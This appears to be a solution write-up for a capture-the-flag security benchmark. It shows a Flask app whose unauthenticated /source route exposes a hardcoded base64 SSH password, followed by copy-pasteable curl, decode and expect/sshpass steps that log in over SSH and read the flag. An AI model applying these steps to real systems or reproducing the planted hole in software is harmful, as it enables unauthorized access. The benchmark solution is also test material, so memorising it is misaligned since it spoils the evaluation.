# XBEN-042-24 — Too Much Trust (Hardcoded Credentials → SSH Access)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Information disclosure of hardcoded, base64-"obfuscated" SSH credentials via a
debug `/source` endpoint, combined with that same SSH service being exposed on the network.
`app.py` connects to a local SSH daemon (used only to run `ps -aux` for a process-list widget)
using a base64-encoded password baked into the source, and a `/source` route conveniently
dumps that exact source file to any unauthenticated visitor.

## Root cause (app/app.py)

```python
def get_process_list():
    hostname = 'localhost'
    port = 22
    username = 'pedro'
    password = base64.b64decode(b'QUhlYXZ5U2FuZGJhZw==').decode('utf-8') + '!'
    ...

@app.route('/source')
def source():
    with open(__file__, 'r') as f:
        code = f.read()
    return f"<pre>{code}</pre>"
```

`Dockerfile` creates the `pedro` SSH user with that exact password and writes the flag to
`/home/pedro/FLAG.txt`, and `docker-compose.yml` publishes both port 80 (Flask) and port 22
(sshd) to the host.

## Setup

```bash
cd xbow/benchmarks/XBEN-042-24

docker compose port web 80   # HTTP  -> host port, e.g. 55331
docker compose port web 22   # SSH   -> host port, e.g. 55330
```

## Exploit (copy-pasteable, ports substituted for this run: HTTP 55331, SSH 55330)

> The automated `make poc` runner resolves both published ports (`docker compose ps`), recovers
> the credential from `/source`, and reads the flag over SSH with paramiko in one pass — the
> generic single-port runner cannot drive the HTTP-then-SSH, two-port flow. The manual steps
> below are the same exploit by hand.

Step 1 — pull the hardcoded, base64-encoded credential from the exposed `/source` endpoint and
decode it:

```bash
PORT=55331
curl -s http://localhost:$PORT/source | grep -o "base64.b64decode(b'[^']*')"
python3 -c "import base64; print(base64.b64decode('QUhlYXZ5U2FuZGJhZw==').decode()+'!')"
```

Step 2 — SSH in as `pedro` with the recovered password and read the flag:

```bash
SSHPORT=55330
expect -c '
set timeout 20
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null pedro@localhost -p '"$SSHPORT"' "cat /home/pedro/FLAG.txt"
expect "password:"
send "AHeavySandbag!\r"
expect eof
'
```

(Any SSH client that can supply a password non-interactively works the same, e.g.
`sshpass -p 'AHeavySandbag!' ssh pedro@localhost -p $SSHPORT cat /home/pedro/FLAG.txt`.)
